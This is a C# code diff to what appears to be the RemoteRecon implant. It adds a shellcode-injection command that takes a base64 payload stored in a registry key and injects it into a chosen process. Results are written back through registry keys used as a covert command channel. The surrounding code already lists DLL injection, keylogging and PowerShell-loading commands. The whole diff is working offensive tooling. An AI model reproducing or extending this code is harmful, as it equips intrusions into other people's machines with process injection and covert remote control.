@@ -120,6 +120,17 @@ namespace RemoteReconCore
                         command = new KeyValuePair<int, object>(0, "");
                         result = new KeyValuePair<int, string>(0, "");
                         break;
+                    case (int)Cmd.InjectSC:
+#if DEBUG
+                        Console.WriteLine("Writing Inject Shellcode command result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, string>(0, "");
+                        break;
                     case (int)Cmd.KeylogStop:
 #if DEBUG
                         Console.WriteLine("Writing Keylog stop command result");
@@ -237,6 +248,19 @@ namespace RemoteReconCore
                 else
                     result = new KeyValuePair<int, string>(0, Convert.ToBase64String(Encoding.ASCII.GetBytes("DllInject success")));
             }
+            else if ((int)Cmd.InjectSC == command.Key)
+            {
+#if DEBUG
+                Console.WriteLine("Received Inject Shellcode command");
+#endif
+                mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
+
+                ReflectiveInjector.Injector obj = new ReflectiveInjector.Injector(Convert.ToInt32(command.Value), mod);
+                if(!obj.InjectSC())
+                    result = new KeyValuePair<int, string>(10, Convert.ToBase64String(Encoding.ASCII.GetBytes("Shellcode Inject failed")));
+                else
+                    result = new KeyValuePair<int, string>(0, Convert.ToBase64String(Encoding.ASCII.GetBytes("Shellcode Inject success")));
+            }
             else if ((int)Cmd.KeylogStop == command.Key)
             {
 #if DEBUG
@@ -290,7 +314,8 @@ namespace RemoteReconCore
             InjectDllFailed = 6,
             KeylogStopFailed = 7,
             SleepFailed = 8,
-            LoadPS = 9
+            LoadPS = 9,
+            InjectSCFailed = 10
         }
 
         //Command enum 
@@ -305,7 +330,8 @@ namespace RemoteReconCore
             InjectDll = 6,
             KeylogStop = 7,
             Sleep = 8,
-            LoadPS = 9
+            LoadPS = 9,
+            InjectSC = 10
         }
         
         //Helper function to patch the Native module with the appropriate command
